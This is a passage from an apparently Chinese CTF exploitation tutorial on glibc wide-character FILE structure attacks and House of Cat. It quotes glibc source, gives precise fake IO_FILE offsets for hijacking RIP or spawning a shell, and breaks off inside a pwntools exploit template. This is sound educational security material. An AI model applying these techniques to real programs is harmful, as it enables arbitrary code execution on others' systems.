_IO_ERR_SEEN;</span><br><span class=\"line\">      __set_errno (EBADF);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> WEOF;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"comment\">/* If currently reading or no buffer allocated. */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* Allocate a buffer if needed. */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      _IO_wdoallocbuf (f);<span class=\"comment\">// 需要走到这里</span></span><br><span class=\"line\">      <span class=\"comment\">// ......</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>需要满足<code>_flags &amp; _IO_NO_WRITES==0</code>，<code>_flags &amp; _IO_CURRENTLY_PUTTING==0</code>和<code>_wide_data-&gt;_IO_write_base == 0</code>。</p>\n<p>在<code>_IO_wdoallocbuf</code>函数中需要使其调用</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> _IO_wdoallocbuf (FILE *fp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((<span class=\"type\">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)<span class=\"comment\">// _IO_WXXXX调用，需要走到这里</span></span><br><span class=\"line\">      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class=\"line\">             fp-&gt;_wide_data-&gt;_shortbuf + <span class=\"number\">1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">libc_hidden_def (_IO_wdoallocbuf)</span><br></pre></td></tr></table></figure>\n\n<p>需要满足<code>_wide_data-&gt;_IO_buf_base==0</code>和<code>_flags &amp; _IO_UNBUFFERED==0</code>。</p>\n<p>综上需要对伪造的IO_FILE进行一下设置：</p>\n<ul>\n<li><code>_flags</code>设置为<code>~(2 | 0x8 | 0x800)</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>  sh;</code>，注意前面有两个空格</li>\n<li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code>即可</li>\n<li><code>fp-&gt;_mode&lt;=0</code></li>\n<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>\n<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>\n<li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(A + 0x18) = 0</code></li>\n<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>\n<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>\n<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>\n</ul>\n<p>（2）利用<code>_IO_wfile_underflow_mmap</code>控制程序执行流（走<code>_IO_WDOALLOCATE</code>）</p>\n<p>调用链如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_IO_wfile_underflow_mmap</span><br><span class=\"line\">    _IO_wdoallocbuf</span><br><span class=\"line\">        _IO_WDOALLOCATE</span><br><span class=\"line\">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class=\"number\">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>\n\n<p>在<code>_IO_wfile_underflow_mmap</code>中需要绕过一些检测，使其成功调用<code>_IO_wdoallocbuf</code>。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">wint_t</span> _IO_wfile_underflow_mmap (FILE *fp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_codecvt</span> *<span class=\"title\">cd</span>;</span></span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"type\">char</span> *read_stop;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class=\"line\">      __set_errno (EBADF);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> WEOF;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class=\"line\"> </span><br><span class=\"line\">  cd = fp-&gt;_codecvt;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* Maybe there is something left in the external buffer.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class=\"line\">      <span class=\"comment\">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class=\"line\">      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)</span><br><span class=\"line\">    <span class=\"comment\">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class=\"line\"><span class=\"comment\">       flags as appropriate.  */</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> WEOF;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* There is more in the external.  Convert it.  */</span></span><br><span class=\"line\">  read_stop = (<span class=\"type\">const</span> <span class=\"type\">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* Maybe we already have a push back pointer.  */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);</span><br><span class=\"line\">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">      _IO_wdoallocbuf (fp);<span class=\"comment\">// 需要走到这里</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//......</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>需要满足<code>_flags &amp; _IO_NO_READS == 0</code>，<code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>和<code>_IO_read_ptr &lt; _IO_read_end</code>绕过前面的return。设置<code>_wide_data-&gt;_IO_buf_base == NULL</code>和<code>_wide_data-&gt;_IO_save_base == NULL</code>调用<code>_IO_wdoallocbuf (fp)</code>。</p>\n<p>综上需要对伪造的IO_FILE进行一下设置：</p>\n<ul>\n<li><code>_flags</code>设置为<code>~4</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>sh;</code>，注意前面有个空格</li>\n<li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li>\n<li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li>\n<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>\n<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li>\n<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>\n<li><code>_wide_data-&gt;_IO_save_base</code>设置为<code>0</code>或者合法的可被<code>free</code>的地址，即满足<code>*(A + 0x40) = 0</code></li>\n<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>\n<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>\n</ul>\n<p>（3）利用<code>_IO_wdefault_xsgetn</code>控制程序执行流（走<code>_IO_WOVERFLOW</code>）</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_IO_wdefault_xsgetn</span><br><span class=\"line\">    __wunderflow</span><br><span class=\"line\">        _IO_switch_to_wget_mode</span><br><span class=\"line\">            _IO_WOVERFLOW</span><br><span class=\"line\">                *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class=\"number\">0x18</span>)(fp)</span><br></pre></td></tr></table></figure>\n\n<p>在<code>_IO_wdefault_xsgetn</code>中需要绕过一些检测，使其成功调用<code>__wunderflow</code>。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">size_t</span> _IO_wdefault_xsgetn (FILE *fp, <span class=\"type\">void</span> *data, <span class=\"type\">size_t</span> n)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">size_t</span> more = n;</span><br><span class=\"line\">  <span class=\"type\">wchar_t</span> *s = (<span class=\"type\">wchar_t</span>*) data;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (;;)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* Data available. */</span></span><br><span class=\"line\">      <span class=\"type\">ssize_t</span> count = (fp-&gt;_wide_data-&gt;_IO_read_end</span><br><span class=\"line\">                       - fp-&gt;_wide_data-&gt;_IO_read_ptr);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (count &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ((<span class=\"type\">size_t</span>) count &gt; more)</span><br><span class=\"line\">        count = more;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (count &gt; <span class=\"number\">20</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          s = __wmempcpy (s, fp-&gt;_wide_data-&gt;_IO_read_ptr, count);</span><br><span class=\"line\">          fp-&gt;_wide_data-&gt;_IO_read_ptr += count;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (count &lt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">        count = <span class=\"number\">0</span>;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"type\">wchar_t</span> *p = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class=\"line\">          <span class=\"type\">int</span> i = (<span class=\"type\">int</span>) count;</span><br><span class=\"line\">          <span class=\"keyword\">while</span> (--i &gt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">        *s++ = *p++;</span><br><span class=\"line\">          fp-&gt;_wide_data-&gt;_IO_read_ptr = p;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            more -= count;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (more == <span class=\"number\">0</span> || __wunderflow (fp) == WEOF) <span class=\"comment\">//进入这里</span></span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> n - more;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">libc_hidden_def (_IO_wdefault_xsgetn)</span><br></pre></td></tr></table></figure>\n\n<p>需要满足<code>_wide_data-&gt;_IO_read_end - _wide_data-&gt;_IO_read_ptr== 0</code>不进入第一个if。之后需要<code>mode!=0</code>调用<code>__wunderflow(fp)</code>。</p>\n<p>之后要进入<code>_IO_switch_to_wget_mode</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">wint_t</span> __wunderflow (FILE *fp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_mode &lt; <span class=\"number\">0</span> || (fp-&gt;_mode == <span class=\"number\">0</span> &amp;&amp; _IO_fwide (fp, <span class=\"number\">1</span>) != <span class=\"number\">1</span>))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> WEOF;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_mode == <span class=\"number\">0</span>)</span><br><span class=\"line\">    _IO_fwide (fp, <span class=\"number\">1</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (_IO_in_put_mode (fp))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (_IO_switch_to_wget_mode (fp) == EOF) <span class=\"comment\">//进入这里</span></span><br><span class=\"line\">      <span class=\"keyword\">return</span> WEOF;</span><br><span class=\"line\">    <span class=\"comment\">// ......</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>需要满足<code>mode&gt;0</code>（前面已经让mode!=0）绕过第一个if。之后需要<code>_flags &amp; _IO_CURRENTLY_PUTTING != 0</code>，调用<code>_IO_switch_to_wget_mode</code>。</p>\n<p>最后真正进入<code>_IO_WXXXX</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> _IO_switch_to_wget_mode (FILE *fp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((<span class=\"type\">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF) <span class=\"comment\">// 需要走到这里</span></span><br><span class=\"line\">      <span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\">    <span class=\"comment\">// .....</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>需要满足<code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>调用<code>_IO_WOVERFLOW</code>。</p>\n<p>综上需要对伪造的IO_FILE进行一下设置：</p>\n<ul>\n<li><code>_flags</code>设置为<code>0x800</code></li>\n<li><code>vtable</code>设置为<code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wdefault_xsgetn</code>即可</li>\n<li><code>_mode</code>设置为大于<code>0</code>，即满足<code>*(fp + 0xc0) &gt; 0</code></li>\n<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>\n<li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code>设置为<code>0</code>，即满足<code>*(A + 8) = *A</code></li>\n<li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt; *(A + 0x18)</code></li>\n<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>\n<li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x18) = C</code></li>\n</ul>\n<h3 id=\"House-of-Cat\"><a href=\"#House-of-Cat\" class=\"headerlink\" title=\"House of Cat\"></a>House of Cat</h3><p>House of Cat利用了**_IO_wfile_jumps<strong>中的</strong>_IO_wfile_seekoff<strong>函数，最后</strong>_IO_switch_to_wget_mode<strong>函数中来攻击，在</strong>FSOP<strong>的情况下也是可行的，只需修改虚表指针的偏移来调用</strong>_IO_wfile_seekoff<strong>即可（通常是结合</strong>__malloc_assert<strong>，改vtable为</strong>_IO_wfile_jumps+0x10**）。</p>\n<p>调用链：<code>_IO_wfile_seekoff -&gt; _IO_switch_to_wget_mode -&gt; _IO_WOVERFLOW</code></p>\n<p><code>_IO_wfile_seekoff</code>如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">off64_t</span> _IO_wfile_seekoff (FILE *fp, <span class=\"type\">off64_t</span> offset, <span class=\"type\">int</span> dir, <span class=\"type\">int</span> mode)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">off64_t</span> result;</span><br><span class=\"line\">  <span class=\"type\">off64_t</span> delta, new_offset;</span><br><span class=\"line\">  <span class=\"type\">long</span> <span class=\"type\">int</span> count;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (mode == <span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> do_ftell_wide (fp);</span><br><span class=\"line\">  <span class=\"type\">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class=\"line\">            == fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class=\"line\">               &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class=\"line\">               == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class=\"line\">#需要绕过was_writing的检测</span><br><span class=\"line\">  <span class=\"type\">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class=\"line\">               &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class=\"line\">              || _IO_in_put_mode (fp));</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp)) <span class=\"comment\">//进入_IO_switch_to_wget_mode</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> WEOF;</span><br><span class=\"line\">......</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>_IO_switch_to_wget_mode</code>如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> _IO_switch_to_wget_mode (FILE *fp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((<span class=\"type\">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF) <span class=\"comment\">// 需要走到这里</span></span><br><span class=\"line\">      <span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\">    <span class=\"comment\">// .....</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>如果要利用<code>_IO_WOVERFLOW</code>，我们将其设置为<code>system</code>或者<code>one_gadget</code>，调用到这里就可以<code>get shell</code>。不过如果遇到了<strong>开启沙箱</strong>的情况，这种方法就不可行了，我们就要考虑其他方式。</p>\n<p>先看看<code>_IO_switch_to_wget_mode</code>调用<code>_IO_WOVERFLOW</code>的汇编代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x7f4cae745d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0] </span><br><span class=\"line\">;rdi==fp</span><br><span class=\"line\">;rax=fp+0xa0==wide_data</span><br><span class=\"line\">0x7f4cae745d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]</span><br><span class=\"line\">;rdx=wide_data-&gt;_IO_write_ptr</span><br><span class=\"line\">0x7f4cae745d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0] ;rax=wide_data+0xe0==wide_data-&gt;vtable</span><br><span class=\"line\">0x7f4cae745d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18] </span><br><span class=\"line\">;call wide_data-&gt;vtable+0x18==_IO_WOVERFLOW</span><br></pre></td></tr></table></figure>\n\n<p>可以看到这个过程通过将<code>fp</code>传入寄存器<code>rdi</code>，并通过对寄存器<code>rdi</code>进行操作，从中取出<code>wide_data中的_IO_write_ptr</code>和<code>wide_data中的vtable</code>，最后调用<code>vtable中的_IO_WOVERFLOW</code>。</p>\n<p>可以看到<code>wide_data中的_IO_write_ptr</code>被放入<code>rdx</code>，<code>wide_data中的vtable</code>被放入<code>rax</code>，通过<code>call   qword ptr [rax + 0x18]</code>调用<code>_IO_WOVERFLOW</code>，而这个<code>vtable</code>也是通过<code>rdi</code>的偏移再间址访问再偏移取得的。由于<code>IO_FILE</code>结构已经被我们劫持，因此寄存器<code>rdi</code>中的值是我们伪造的<code>IO_FILE</code>，是可以被我们所控制的，因此<code>rdx</code>和<code>rax</code>都是可以被我们控制的，所以**除了可以控制<code>rax</code>为伪造的<code>_IO_WOVERFLOW</code>之外，我们还可以控制寄存器<code>rdx</code>**。</p>\n<p>这样我们就可以<strong>利用<code>setcontext</code>来控制程序流程</strong>了，后面无论是走<code>ROP的orw</code>还是走<code>shellcode的orw</code>都可以得到flag了。</p>\n<p><code>House of Cat</code>的模板如下：（具体情况还需要调试修改）</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fake_io_addr=heapbase+<span class=\"number\">0xb00</span> <span class=\"comment\"># 伪造的fake_IO结构体的地址</span></span><br><span class=\"line\">next_chain = <span class=\"number\">0</span></span><br><span class=\"line\">fake_IO_FILE=p64(rdi)         <span class=\"comment\">#_flags=rdi</span></span><br><span class=\"line\">fake_IO_FILE+=p64(<span class=\"number\">0</span>)*<span class=\"number\">7</span></span><br><span class=\"line\">fake_IO_FILE +=p64(<span class=\"number\">1</span>)+p64(<span class=\"number\">2</span>) <span class=\"comment\"># rcx!=0(FSOP)</span></span><br><span class=\"line\">fake_IO_FILE +=p64(fake_io_addr+<span class=\"number\">0xb0</span>)<span class=\"comment\">#_IO_backup_base=伪造rdx的值 </span></span><br><span class=\"line\">fake_IO_FILE +=p64(call_addr)<span class=\"comment\">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class=\"line\">fake_IO_FILE = fake_IO_FILE.ljust(<span class=\"number\">0x68</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_IO_FILE += p64(<span class=\"number\">0</span>)  <span class=\"comment\"># _chain</span></span><br><span class=\"line\">fake_IO_FILE = fake_IO_FILE.ljust(<span class=\"number\">0x88</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_IO_FILE += p64(heapbase+<span class=\"number\">0x1000</span>)  <span class=\"comment\"># _lock = a writable address</span></span><br><span class=\"line\">fake_IO_FILE = fake_IO_FILE.ljust(<span class=\"number\">0xa0</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_IO_FILE +=p64(fake_io_addr+<span class=\"number\">0x30</span>)<span class=\"comment\">#_wide_data,rax1_addr</span></span><br><span class=\"line\">fake_IO_FILE = fake_IO_FILE.ljust(<span class=\"number\">0xc0</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_IO_FILE += p64(<span class=\"number\">1</span>) <span class=\"comment\">#mode=1</span></span><br><span class=\"line\">fake_IO_FILE = fake_IO_FILE.ljust(<span class=\"number\">0xd8</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_IO_FILE += p64(libcbase+<span 